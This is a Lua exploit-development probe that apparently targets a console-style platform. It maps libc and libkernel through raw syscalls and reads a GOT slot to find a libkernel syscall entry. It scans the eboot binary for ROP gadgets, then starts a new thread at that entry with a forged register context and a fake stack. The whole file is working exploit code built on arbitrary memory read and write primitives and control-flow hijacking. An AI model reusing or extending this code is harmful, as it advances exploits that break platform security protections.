-- CRASH_CLASS: HIGH (enters a libkernel function from a new thread)
-- PROBE 520a: call libkernel's syscall entry from a thr_create child.
--
-- 519a: libc's first page is a 16-byte PLT; each stub is `FF 25 disp32` and its
-- GOT slot holds a libkernel address (0x81A1xxxxxx).  518a ranked the stub at
-- libc+0x108 first (34 call sites, wrappers that set eax); that stub's slot is
-- libc+0x1178C8.  If that slot is the generic `syscall(number, ...)` entry, a
-- child thread entered at it with rax=20 should return the pid, which the next
-- gadget stores.
--
-- Child setup: RIP = candidate, RAX = 20 (getpid), RDI = out page,
-- RSP = [mov [rdi],rax; ret][jmp $].  The store gadget must exist in eboot; the
-- scan looks for 48 89 07 C3 and EB FE in the first megabyte.

print("=== PROBE 520a: LIBKERNEL SYSCALL ENTRY ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "string" then return #v == 1 and string.byte(v) or 0 end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return to_num(val.h), to_num(val.l) end
    return 0, tonumber(val) or 0
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = (rd(a + i) or 0) % 256
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end
local function zero(a, n) for off = 0, n - 4, 4 do wd(a + off, 0) end end

local sc_getpid = make_syscall(20)
local sc674 = make_syscall(674)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
pcall(function() return sc_getpid() end)

-- [0] regions
local STRIDE, MAX = 72, 512
local buf = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(buf + i, 0) end
local countp = memory.alloc(16)
wq(countp, uint64(0))
pcall(function()
    return sc674(uint64(buf), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
end)
local count = rd(countp) or 0
if count > MAX then count = MAX end
local libc_base, k_lo, k_hi = nil, nil, nil
for i = 0, count - 1 do
    local base = buf + i * STRIDE
    local prot = rd(base + 0x18) or 0
    local name = ascii(base + 0x20, 0x20)
    local lo = (rd(base) or 0) + (rd(base + 4) or 0) * 4294967296
    local hi = (rd(base + 8) or 0) + (rd(base + 12) or 0) * 4294967296
    if name:find("libc") and (prot % 4) ~= 0 and (prot % 8) >= 4 and libc_base == nil then
        libc_base = lo
    end
    if name:find("libkernel") then
        if k_lo == nil or lo < k_lo then k_lo = lo end
        if k_hi == nil or hi > k_hi then k_hi = hi end
    end
end
print(string.format("[0] libc=%X libkernel=[%s,%s)", libc_base or 0, tostring(k_lo), tostring(k_hi)))
if not libc_base then print("no libc"); print("=== DONE ==="); return end

-- [1] the slot values around the top stub
local slot_base = libc_base + 0x1178C8
print("[1] GOT around the top stub:")
for d = -16, 16, 8 do
    local q = rq(uint64(slot_base + d))
    print(string.format("    %08X %s", slot_base + d, hexq(q)))
end
local cand_q = rq(uint64(slot_base))
local cand = nil
if cand_q ~= nil then
    local h, l = get_hi_lo(cand_q)
    cand = h * 4294967296 + l
    print(string.format("[1] candidate = 0x%08X_%08X", h, l))
end
if not cand or not k_lo or cand < k_lo or cand >= k_hi then
    print("[1] candidate not in libkernel; aborting without a thread")
    print("=== DONE ===")
    return
end

-- [2] eboot base and gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), uint64(info)) end)
local tlo = rd(info + 0x108)
local thi = rd(info + 0x10C)
if not tlo then print("[2] no eboot base"); print("=== DONE ==="); return end
local eboot = uint64(string.format("0x%X%08X", thi or 0, tlo or 0))
print("[2] eboot=" .. hexq(eboot))

local mov_store, jmp_self = nil, nil
local t0 = os.clock()
for off = 0, 0x100000, 1 do
    local v = rd(eboot + off)
    if v then
        local b0, b1, b2, b3 = v % 256, math.floor(v / 256) % 256, math.floor(v / 65536) % 256, math.floor(v / 16777216) % 256
        if mov_store == nil and b0 == 0x48 and b1 == 0x89 and b2 == 0x07 and b3 == 0xC3 then
            mov_store = tlo + off
        end
        if jmp_self == nil and b0 == 0xEB and b1 == 0xFE then
            jmp_self = tlo + off
        end
        if mov_store and jmp_self then break end
    end
end
print(string.format("[2] mov [rdi],rax;ret=%s jmp $=%s in %.1fs",
    mov_store and string.format("%08X", mov_store) or "none",
    jmp_self and string.format("%08X", jmp_self) or "none", os.clock() - t0))
if not mov_store or not jmp_self then print("=== DONE ==="); return end

-- [3] child
local page = memory.alloc(0x4000)
zero(page, 0x4000)
local stack = page + 0x2000
wq(stack, uint64(mov_store))
wq(stack + 8, uint64(jmp_self))

local ctx = memory.alloc(0x200)
zero(ctx, 0x200)
wd(ctx + 0x108, 0x480)
wd(ctx + 0x0D0, 0)
wd(ctx + 0x110, 0x10000)
wd(ctx + 0x0C0, 0x43)
wq(ctx + 0x0E0, uint64(cand))
wq(ctx + 0x0F8, uint64(stack))
wd(ctx + 0x100, 0x3b)
wq(ctx + 0x048, uint64(page))      -- rdi: store target (unused by getpid)
wq(ctx + 0x050, uint64(0))         -- rsi
wq(ctx + 0x058, uint64(0))         -- rdx
wq(ctx + 0x060, uint64(0))         -- rcx
wq(ctx + 0x068, uint64(0))         -- r8
wq(ctx + 0x070, uint64(0))         -- r9
wq(ctx + 0x078, uint64(20))        -- rax: getpid
wq(ctx + 0x080, uint64(0))         -- rbx
local tid = memory.alloc(8)
zero(tid, 8)
local okc, rvc = pcall(function() return sc_thr_create(uint64(ctx), uint64(tid), uint64(0), uint64(0)) end)
print(string.format("[3] thr_create ret=%s tid=%s", okc and tostring(to_num(rvc)) or "pcall-fail", hexq(rq(tid))))

local ts = memory.alloc(16)
wd(ts, 0); wd(ts + 4, 50 * 1000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
print("[4] out page qwords:")
for i = 0, 3 do print(string.format("    +%02X %s", i * 8, hexq(rq(page + i * 8)))) end
print("=== DONE ===")
